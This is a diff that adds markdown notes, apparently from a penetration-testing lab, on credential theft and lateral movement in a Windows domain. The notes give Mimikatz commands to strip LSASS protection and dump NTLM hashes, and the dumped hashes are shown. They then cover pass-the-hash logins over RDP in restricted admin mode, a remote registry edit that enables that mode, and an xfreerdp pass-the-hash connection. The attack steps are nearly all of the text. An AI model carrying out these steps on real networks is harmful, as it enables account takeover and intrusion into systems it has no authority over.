@@ -1,0 +1,27 @@
+# In order to abuse priv esclation  we need tocapture NTLM hashes from the user
+
+    Login into Appsrv01 server and dump the creds
+    Mimi> privilege::debug
+    Mimi> !processprotect /process:lsass.exe /remove
+    Mimi> sekurlsa::logonpasswords
+           [00000003] Primary
+         * Username : dave
+         * Domain   : corp1
+         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
+         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
+         * DPAPI    : 6904835e1ba09b07bbef109c34d515d6
+
+# Now using remote windows system login using NTLM hash from mimikatz
+
+  mimi> privilege::debug
+  mimi> sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
+  We are successfully logged in. 
+
+# Sometimes restricted admin mode is disabeld by default and we need to enable it directly from shell
+
+  mimi> sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
+  ps > Enter-PSSession -Computer appsrv01
+  ps > New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
+  ps >  Exit
+
+  Kali> xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
